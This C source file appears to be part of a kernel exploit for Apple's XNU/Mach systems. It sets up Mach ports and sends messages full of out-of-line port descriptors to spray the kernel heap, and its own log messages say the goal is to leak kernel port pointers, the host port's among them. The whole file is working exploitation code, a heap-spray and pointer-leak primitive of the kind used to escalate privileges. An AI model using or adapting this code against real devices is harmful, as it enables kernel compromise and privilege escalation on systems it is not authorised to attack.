#include "mach-ports.h"

int prepare_ports(mach_port_t *receive_port, mach_port_t *target_port, mach_port_t *own_task_port) {
    int ret;

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, target_port) != KERN_SUCCESS)) {
        printf("target_port Allocation Failed: %x", ret);
        return 1;
    }
    mach_port_insert_right(mach_task_self(), *target_port, *target_port, MACH_MSG_TYPE_MAKE_SEND);

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receive_port)) != KERN_SUCCESS) {
        printf("receive_port Allocation Failed: %x\n", ret);
        mach_port_destroy(mach_task_self(), *target_port);
        return 1;
    }

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, own_task_port)) != KERN_SUCCESS) {
        printf("own_task_port Allocation Failed: %x\n", ret);
        mach_port_destroy(mach_task_self(), *target_port);
        mach_port_destroy(mach_task_self(), *receive_port);
        return 1;
    }
    mach_port_insert_right(mach_task_self(), *own_task_port, *own_task_port, MACH_MSG_TYPE_MAKE_SEND);

    return 0;
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data);

int spray_port_pointer(mach_port_t receive_port, mach_port_t target_port, mach_port_t other_port) {
    int i, ret;
    mach_port_t *ports;

    ports = calloc(N_PORTS_LEAK, sizeof(mach_port_t));
    for (i = 0; i < N_PORTS_LEAK; i++) {
        if (i == 2)
            ports[i] = target_port;
        else if (i == 3)
            ports[i] = other_port;
        else if (i == 4)
            ports[i] = mach_host_self();
        else
            ports[i] = MACH_PORT_NULL;
    }

    if (ool_ports_descriptor_spray(receive_port, N_OOL_PORTS_DESCRIPTOR, N_PORTS_LEAK, ports)) {
        printf("Could Not Leak Port Pointers\n");
        return 1;
    } else {
        printf("Sprayed Heap To Leak Port Pointer\n");
        ret = 0;
    }

    free(ports);
    return ret;
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t n_ool_ports_descriptor_messages,
			       size_t count, mach_port_t *data) {
    size_t i, msg_size;
    mach_port_t *ports;
    ool_leak_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_leak_msg) +
		(n_ool_ports_descriptor_messages * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = n_ool_ports_descriptor_messages;

    for (i = 0; i < n_ool_ports_descriptor_messages; i++) {
        ool_msg->ool_ports[i].address = data;
        ool_msg->ool_ports[i].count = count;
        ool_msg->ool_ports[i].deallocate = 0;
        ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS) {
        printf("Sending Mach Message Failed: %x\n", ret);
        printf("Could Not Spray Heap Via Port Descriptors\n");
        return 1;
    } else
	    printf("Successfully Sent Mach Messages For Port Descriptor Spray\n");

    free(ool_msg);

    return 0;
}